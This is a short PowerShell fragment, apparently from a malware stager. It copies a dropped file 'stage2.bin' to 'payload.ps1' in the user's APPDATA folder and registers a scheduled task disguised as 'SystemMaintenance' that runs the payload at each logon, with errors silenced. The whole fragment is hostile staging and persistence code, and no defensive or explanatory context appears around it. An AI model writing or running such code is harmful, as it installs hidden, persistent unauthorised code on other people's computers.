
<# Staged execution #> Copy-Item -Path "$env:APPDATA\stage2.bin" -Destination "$env:APPDATA\payload.ps1" -Force -ErrorAction SilentlyContinue; schtasks.exe /Create /TN 'SystemMaintenance' /TR "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`"" /SC ONLOGON /F; Write-Verbose "stage marker 44 reached"; $StageMarker = "stage-25"
